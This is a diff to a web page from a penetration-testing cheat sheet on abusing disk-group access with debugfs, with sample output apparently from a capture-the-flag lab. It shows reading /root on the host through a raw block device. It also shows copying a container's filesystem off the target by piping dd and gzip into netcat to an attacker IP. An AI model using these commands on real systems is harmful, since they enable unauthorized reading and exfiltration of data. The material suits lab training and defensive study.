@@ -184,6 +184,8 @@
   
   <li><a href="https://tldrbins.github.io/@lvm/">LVM</a></li>
   
+  <li><a href="https://tldrbins.github.io/@debugfs/">Debugfs</a></li>
+  
 </ul>
 <hr>
 <div class="content">
@@ -331,34 +333,100 @@ body.dark-mode #dynamicFormContainer button:hover {
   <h3 id="basic">Basic</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show devices
 </span></span><span class="line"><span class="cl"><span class="go">lsblk
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> lsblk
+</span></span><span class="line"><span class="cl"><span class="go">NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+</span></span></span><span class="line"><span class="cl"><span class="go">sda                      8:0    0   12G  0 disk 
+</span></span></span><span class="line"><span class="cl"><span class="go">├─sda1                   8:1    0  120M  0 part /boot
+</span></span></span><span class="line"><span class="cl"><span class="go">├─sda2                   8:2    0    1K  0 part 
+</span></span></span><span class="line"><span class="cl"><span class="go">└─sda5                   8:5    0 11.9G  0 part 
+</span></span></span><span class="line"><span class="cl"><span class="go">  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
+</span></span></span><span class="line"><span class="cl"><span class="go">  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
+</span></span></span><span class="line"><span class="cl"><span class="go">sr0                     11:0    1 1024M  0 rom
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Device attributes
 </span></span><span class="line"><span class="cl"><span class="go">blkid
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> blkid
+</span></span><span class="line"><span class="cl"><span class="go">/dev/sda1: UUID=&#34;67e178a9-1b2a-407e-8d3f-7b1772bab2be&#34; TYPE=&#34;ext2&#34; PARTUUID=&#34;1b9f3540-01&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/sda5: UUID=&#34;LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD&#34; TYPE=&#34;LVM2_member&#34; PARTUUID=&#34;1b9f3540-05&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/mapper/Kotarak--vg-root: UUID=&#34;efb44a28-8edc-4d40-aca3-81e57d58d759&#34; TYPE=&#34;ext4&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/mapper/Kotarak--vg-swap_1: UUID=&#34;162b2913-7dcf-4ba7-bddc-238a22f16e52&#34; TYPE=&#34;swap&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show device mapping
+</span></span><span class="line"><span class="cl"><span class="go">ls -l /dev/mapper/
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ls -l /dev/mapper/
+</span></span><span class="line"><span class="cl"><span class="go">total 0
+</span></span></span><span class="line"><span class="cl"><span class="go">crw------- 1 root root 10, 236 Sep 22 23:22 control
+</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -&gt; ../dm-0
+</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -&gt; ../dm-1
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show swap on blk
 </span></span><span class="line"><span class="cl"><span class="go">swapon -s
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> swapon -s
+</span></span><span class="line"><span class="cl"><span class="go">Filename                                Type            Size    Used    Priority
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/dm-1                               partition       1048572 0       -1
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Filesystem info
 </span></span><span class="line"><span class="cl"><span class="go">cat /etc/fstab
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /etc/fstab
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> /etc/fstab: static file system information.
+</span></span><span class="line"><span class="cl"><span class="gp">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Use &#39;blkid&#39; to print the universally unique identifier for a</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> device<span class="p">;</span> this may be used with <span class="nv">UUID</span><span class="o">=</span> as a more robust way to name devices
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> that works even <span class="k">if</span> disks are added and removed. See fstab<span class="o">(</span>5<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="gp">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="go">/dev/mapper/Kotarak--vg-root /               ext4    errors=remount-ro 0       1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> /boot was on /dev/sda1 during installation
+</span></span><span class="line"><span class="cl"><span class="go">UUID=67e178a9-1b2a-407e-8d3f-7b1772bab2be /boot           ext2    defaults        0       2
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/mapper/Kotarak--vg-swap_1 none            swap    sw              0       0
+</span></span></span><span class="line"><span class="cl"><span class="go">/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
 </span></span></span></code></pre></div><hr>
 <h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read host&rsquo;s filesystem from container (root)</h3>
 <h4 id="1-open-target-device">1. Open target device</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">debugfs /dev/sda1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> debugfs /dev/sda1
+</span></span><span class="line"><span class="cl"><span class="go">debugfs 1.44.1 (24-Mar-2018)
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Read
-</span></span><span class="line"><span class="cl"><span class="go">ls /root
+</span></span><span class="line"><span class="cl"><span class="go">ls -l /root
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">   2456   40750 (2)      0      0    4096 23-Sep-2024 06:49 .
+</span></span></span><span class="line"><span class="cl"><span class="go">      2   40755 (2)      0      0    4096 24-Nov-2023 10:10 ..
+</span></span></span><span class="line"><span class="cl"><span class="go">   2457  100600 (1)      0      0    3121 27-Nov-2017 22:45 .bashrc
+</span></span></span><span class="line"><span class="cl"><span class="go">   2458  100600 (1)      0      0     148 17-Aug-2015 18:30 .profile
+</span></span></span><span class="line"><span class="cl"><span class="go">  50878   40700 (2)      0      0    4096 13-Sep-2022 18:51 .cache
+</span></span></span><span class="line"><span class="cl"><span class="go">  50115  100400 (1)      0      0      33 23-Sep-2024 06:49 root.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"> 131982   40755 (2)      0      0    4096 24-Nov-2023 09:41 .nano
+</span></span></span><span class="line"><span class="cl"><span class="go">  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .ssh
+</span></span></span><span class="line"><span class="cl"><span class="go">  30962  120777 (7)      0      0       9 13-Sep-2022 18:36 .bash_history
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(END)
 </span></span></span></code></pre></div><hr>
 <h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read container&rsquo;s filesystem from host</h3>
 <h4 id="1-show-lvm-mappings">1. Show LVM mappings</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ls -l /dev/mapper/
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ls -l /dev/mapper/
+</span></span><span class="line"><span class="cl"><span class="go">total 0
+</span></span></span><span class="line"><span class="cl"><span class="go">crw------- 1 root root 10, 236 Sep 22 23:22 control
+</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -&gt; ../dm-0
+</span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -&gt; ../dm-1
 </span></span></span></code></pre></div><h4 id="2-exfil-containers-filesystem">2. Exfil container&rsquo;s filesystem</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> machine
-</span></span><span class="line"><span class="cl"><span class="go">nc -lvnp &lt;LOCAL_PORT&gt; &gt; dm-0.gz
+</span></span><span class="line"><span class="cl"><span class="go">nc -lvnp &lt;LOCAL_PORT&gt; &gt; &lt;DEVICE_MAPPING&gt;.gz
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc -lvnp <span class="m">4444</span> &gt; dm-0.gz
+</span></span><span class="line"><span class="cl"><span class="go">listening on [any] 4444 ...
+</span></span></span><span class="line"><span class="cl"><span class="go">connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 35450
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Target container rootfs, e.g. dm-0
-</span></span><span class="line"><span class="cl"><span class="go">dd if=/dev/dm-0 | gzip -1 - | nc &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;
+</span></span><span class="line"><span class="cl"><span class="go">dd if=/dev/&lt;DEVICE_MAPPING&gt; | gzip -1 - | nc &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dd <span class="k">if</span><span class="o">=</span>/dev/dm-0 <span class="p">|</span> gzip -1 - <span class="p">|</span> nc 10.10.14.31 <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="go">14680064+0 records in
+</span></span></span><span class="line"><span class="cl"><span class="go">14680064+0 records out
+</span></span></span><span class="line"><span class="cl"><span class="go">7516192768 bytes (7.5 GB, 7.0 GiB) copied, 306.697 s, 24.5 MB/s
 </span></span></span></code></pre></div><h4 id="3-mount-locally">3. Mount locally</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract dm-0
-</span></span><span class="line"><span class="cl"><span class="go">gunzip dm-0.gz
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mount the filesystem
-</span></span><span class="line"><span class="cl"><span class="go">sudo mount dm-0-orig /mnt/ 
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Read
+</span></span><span class="line"><span class="cl"><span class="go">gunzip &lt;DEVICE_MAPPING&gt;.gz
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gunzip dm-0.gz
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mount the filesystem
+</span></span><span class="line"><span class="cl"><span class="go">sudo mount &lt;DEVICE_MAPPING&gt; /mnt/ 
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo mount dm-0 /mnt/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Read
 </span></span><span class="line"><span class="cl"><span class="go">ls /mnt/root/
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ls /mnt/root/
+</span></span><span class="line"><span class="cl"><span class="go">app.log  flag.txt
 </span></span></span></code></pre></div><p><small><em>Note: can take a long time to transfer</em></small></p>
 
 </div></div>
